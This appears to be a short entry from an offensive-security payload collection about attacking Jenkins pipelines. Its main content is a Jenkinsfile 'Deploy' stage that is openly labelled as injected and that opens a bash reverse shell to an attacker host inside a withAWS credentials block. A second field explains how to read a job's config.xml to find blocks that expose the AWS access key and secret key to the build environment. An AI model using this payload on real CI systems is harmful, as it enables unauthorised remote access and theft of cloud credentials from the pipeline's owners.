command:
# In Jenkinsfile - inject reverse shell into pipeline stage:
stage('Deploy') {
  steps {
    withAWS(region: 'us-east-1', credentials: 'aws_key') {
      sh 'bash -c "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1" &'
    }
  }
}

examples.command:
# GET /job/<pipeline_name>/config.xml
# Look for: withAWS(region: ..., credentials: '...') { ... }
# This block injects AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY into the build env
